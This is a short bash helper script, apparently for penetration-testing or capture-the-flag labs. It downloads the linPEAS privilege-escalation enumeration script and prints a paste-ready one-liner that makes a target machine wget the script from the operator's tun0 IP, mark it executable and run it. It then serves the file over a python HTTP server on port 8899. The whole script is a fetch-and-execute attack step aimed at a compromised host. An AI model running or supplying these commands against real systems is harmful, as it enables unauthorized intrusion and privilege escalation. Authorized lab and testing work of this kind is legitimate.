#!/bin/bash

GRN='\e[32m'
WHT='\x1B[37m'

# Retrieve our IP Address on tun0
IPADD=$(ifconfig tun0 2>/dev/null|awk '/inet / {print $2}')
# Download the linpea.sh file
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Command to execute on the target machine (Copy/Paste)
echo -e "${GRN}\ncd /tmp && wget http://${IPADD}:8899/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a | tee linpeas.txt \n${WHT}"

# Start a server on port 8899
python3 -m http.server 8899
